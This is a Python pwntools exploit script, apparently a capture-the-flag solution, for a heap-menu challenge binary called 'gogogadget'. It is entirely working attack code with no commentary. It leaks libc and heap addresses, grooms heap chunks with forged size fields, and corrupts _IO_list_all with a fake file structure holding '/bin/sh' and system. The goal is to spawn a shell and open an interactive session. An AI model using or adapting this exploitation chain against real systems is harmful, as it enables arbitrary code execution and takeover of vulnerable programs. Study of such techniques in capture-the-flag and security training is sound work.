#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']

elf = context.binary = ELF('./gogogadget')
libc = elf.libc

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REM:
        return remote("",)
    else:
        return process(elf.path)


io = start()
sl      = lambda s : io.sendline(s)
sa      = lambda delim,data : io.sendafter(str(delim), str(data))
sla     = lambda delim,data : io.sendlineafter(str(delim), str(data))
sn      = lambda s : io.send(s)
rc      = lambda n : io.recv(n)
rl      = lambda s : io.recvline(s)
#ru = lambda s : io.recvuntil(s)
ru      = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32    = lambda data            : u32(data.ljust(4, '\x00'))
uu64    = lambda data            : u64(data.ljust(8, b'\x00'))
lg      = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
ti      = lambda : io.interactive()


def c(idx):
    sla("Go Go Gadget: ",idx)

def malloc(data):
    c(1)
    sla("Gadget :",data)

def free(idx):
    c(2)
    sla("Gadget [id] :",idx)

def show(idx):
    c(3)
    sla("Gadget [idx] :",idx)

def cpmalloc(size,data):
    c(4)
    sla("Speed :",size)
    sa("Destination :",data)

def cpfree():
    c(5)

def cpshow():
    c(6)
    
    

#one = [0x45226,0x4527a,0xf03a4,0xf1247]
one = [0x45206,0x4525a,0xef9f4,0xf0897]
#
#
malloc('kek')
malloc('kek')
free(0)
cpmalloc(1337, 'A'*8)
cpshow()
ru("Gogo Copter To: ")
address = uu64(rc(16)[8:14])
libc.address   = address - 0x3c3c18
shell  = libc.address + one[1]
iolist = libc.address + 0x3c4520
lg('Libc',libc.address)
lg("shellcode",shell)
cpfree()
free(1)

malloc('kek')
malloc('kek')
malloc('kek')
malloc('kek')

free(0)
free(2)
cpmalloc(1337, 'A'*8)
cpshow()
ru("Gogo Copter To: ")
addr = uu64(rc(16)[8:14])
heap = addr - 0x160
lg('Heap:',heap)
system = libc.sym['system']

cpfree()
free(1)
free(3)

malloc('A'*8) # 0
malloc('B'*8) # 1
malloc('C'*8) # 2
malloc('D'*8) # 3
malloc('E'*8) # 4

free(0)
free(1)
free(2)
free(3)

malloc((p64(2)+p64(3)+p64(system)+ b'\x00'*(0xa8-3*8)).decode("iso-8859-1")) # 0
malloc('G'*0x10) # 1
cpmalloc(0x1337, 'X'*8)

free(1)
free(4)

malloc('H'*0x10) # 1
malloc('I'*0x10) # 2
malloc((b'J'*0x58 + p64(0x91)).decode("iso-8859-1")) # 3
malloc((b'K'*0x38 + p64(0x31) * 1 + p64(heap) + p64(0x31) + p64(0) + p64(0x31)*4 + p64(heap + 8)).decode("iso-8859-1")) # 4

free(3)
free(1)

malloc((b'\x00'*0x50+b'/bin/sh\x00'+p64(0x61)+b'kek'.ljust(8, b'\x00')+p64(iolist-0x10)+p64(2)+p64(3)).decode("iso-8859-1"))

io.sendline("1")

input()


io.interactive()
